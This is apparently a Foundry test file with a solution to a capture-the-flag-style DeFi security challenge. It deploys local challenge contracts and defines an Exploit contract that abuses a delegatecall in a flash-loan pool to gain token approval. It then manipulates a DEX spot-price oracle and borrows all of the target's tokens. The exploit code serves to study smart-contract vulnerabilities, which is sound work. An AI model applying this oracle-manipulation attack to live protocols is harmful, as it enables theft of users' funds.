// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);             // InsecureDexLP - 100 

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);     // InSecureumLenderPool - 10,000

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);            // target - 10,000
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        Exploit exploitContract = new Exploit(token0, token1, target, oracleDex, flashLoanPool);

        // Step 1 : calling the flash loan

        flashLoanPool.flashLoan(address(exploitContract),           
                                abi.encodeWithSignature("receiveFlashLoan(address)", address(exploitContract)));

        
        exploitContract.attackStart();

        //============================//

        vm.stopPrank();

        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;
    InSecureumLenderPool flashLoanPool;

    constructor(IERC20 _token0, IERC20 _token1, BorrowSystemInsecureOracle _borrowSystem, InsecureDexLP _dex, InSecureumLenderPool _flashLoanPool) {

        token0 = _token0;
        token1 = _token1;
        borrowSystem = _borrowSystem;
        dex = _dex;
        flashLoanPool = _flashLoanPool;
    }

    function attackStart() public {

       // step 3 : transfering tokens to ourselves
        token0.transferFrom(address(flashLoanPool), address(this), 10000 ether);



        token0.approve(address(dex), type(uint256).max);
        // ste 4 : swapping all our token0 (InSec) for token1 (boring tokens)
        dex.swap(address(token0), address(token1),  10000 ether);

        console.log("Reserve0 of dex : ", dex.reserve0() / 1 ether);   // 10100
        console.log("Reserve1 of dex : ", dex.reserve1() / 1 ether);   // 0.111

        uint256 currentToken0Bal = token0.balanceOf(address(this));  // 0.1111111 ether
        uint256 currentToken1Bal = token1.balanceOf(address(this));  // 99.999999 ether 

        console.log("Token0 balance of exploiter : ", token0.balanceOf(address(this)) / 1 ether);
        console.log("Token1 balance of exploiter : ", token1.balanceOf(address(this)) / 1 ether);
        
        uint256 returnedPrice = dex.calcAmountsOut(address(token1), currentToken1Bal);

        console.log("returnedPrice : ", returnedPrice/ 1 ether);    // 9999 ether

        token1.approve(address(borrowSystem), type(uint256).max);


        // step 5 : deposit all our token1 (boring tokens) -- to improve our collateral factor 
        // so we can borrow all token 0 in the next step
        borrowSystem.depositToken1(currentToken1Bal);

        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));

    }

     // step 2 : approving ourselves taking advantage of the delegate call
    function receiveFlashLoan(address _exploiter) public {
        console.log("Token0 balance of lenderPool : ", token0.balanceOf(address(this)));

        token0.approve(_exploiter, 10000 ether);

    }

}